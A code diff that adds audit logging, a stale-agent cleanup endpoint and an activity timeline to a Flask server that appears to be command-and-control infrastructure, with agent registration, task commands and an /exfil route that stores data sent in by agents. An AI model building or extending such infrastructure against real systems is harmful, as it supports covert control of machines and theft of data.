@@ -47,6 +47,14 @@ def get_db_connection():
     conn.row_factory = sqlite3.Row
     return conn
 
+def log_event(conn, event_type, agent_id=None, details=None):
+    """Write an event to the audit log."""
+    c = conn.cursor()
+    c.execute(
+        "INSERT INTO events (event_type, agent_id, details) VALUES (?, ?, ?)",
+        (event_type, agent_id, json.dumps(details) if details else None)
+    )
+
 #
 # 1. Dashboard Routes
 #
@@ -318,6 +326,8 @@ def create_task():
                VALUES (?, ?, ?, ?)""",
             (agent_id, description, command.upper(), parameters)
         )
+        log_event(conn, 'task_created', agent_id,
+                  {'command': command.upper(), 'description': description})
         conn.commit()
         conn.close()
 
@@ -623,6 +633,7 @@ def register_agent():
            VALUES (?, ?, 'online', datetime('now'))""",
         (agent_id, hostname)
     )
+    log_event(conn, 'agent_registered', agent_id, {'hostname': hostname})
     conn.commit()
     conn.close()
 
@@ -703,12 +714,16 @@ def exfil():
             VALUES (?, ?, ?, ?)
         """, (agent_id, action, json.dumps(payload), linked_task_id))
 
+        log_event(conn, 'data_received', agent_id, {'data_type': action})
+
         if linked_task_id:
             c.execute("""
                 UPDATE tasks
                 SET status = 'completed'
                 WHERE task_id = ?
             """, (linked_task_id,))
+            log_event(conn, 'task_completed', agent_id,
+                      {'task_id': linked_task_id, 'command': action})
 
         conn.commit()
         return jsonify({'status': 'success'})
@@ -829,6 +844,49 @@ def get_agent_status(agent_id):
         'last_seen': last_seen
     })
 
+@app.route('/api/agents/cleanup', methods=['POST'])
+def cleanup_agents():
+    """Delete agents that have been offline for more than X days."""
+    data = request.json or {}
+    days = max(1, int(data.get('days', 7)))
+
+    conn = get_db_connection()
+    c = conn.cursor()
+    c.execute("""
+        SELECT agent_id, hostname FROM agents
+        WHERE datetime(last_seen) < datetime('now', ?)
+    """, (f'-{days} days',))
+    stale = c.fetchall()
+
+    count = 0
+    for agent in stale:
+        log_event(conn, 'agent_cleaned_up', agent['agent_id'],
+                  {'hostname': agent['hostname'], 'days_threshold': days})
+        c.execute('DELETE FROM tasks WHERE agent_id = ?', (agent['agent_id'],))
+        c.execute('DELETE FROM agents WHERE agent_id = ?', (agent['agent_id'],))
+        count += 1
+
+    conn.commit()
+    conn.close()
+    return jsonify({'success': True, 'cleaned': count})
+
+@app.route('/timeline')
+def timeline():
+    """Activity timeline / audit log."""
+    conn = get_db_connection()
+    c = conn.cursor()
+    c.execute("""
+        SELECT e.event_id, e.event_type, e.agent_id, e.details, e.created_at,
+               a.hostname
+        FROM events e
+        LEFT JOIN agents a ON e.agent_id = a.agent_id
+        ORDER BY e.created_at DESC
+        LIMIT 500
+    """)
+    events = [dict(r) for r in c.fetchall()]
+    conn.close()
+    return render_template('timeline.html', events=events)
+
 @app.route('/api/agents/<agent_id>/notes', methods=['POST'])
 def update_agent_notes(agent_id):
     """Update notes for an agent."""
@@ -849,17 +907,23 @@ def delete_agent(agent_id):
     
     # Delete related tasks first
     c.execute('DELETE FROM tasks WHERE agent_id = ?', (agent_id,))
-    
+
+    # Log before deleting
+    c.execute('SELECT hostname FROM agents WHERE agent_id = ?', (agent_id,))
+    row = c.fetchone()
+    if row:
+        log_event(conn, 'agent_deleted', agent_id, {'hostname': row['hostname']})
+
     # Delete agent
     c.execute('DELETE FROM agents WHERE agent_id = ?', (agent_id,))
     success = c.rowcount > 0
-    
+
     conn.commit()
     conn.close()
-    
+
     if not success:
         return jsonify({'error': 'Agent not found'}), 404
-        
+
     return '', 204
 
 #
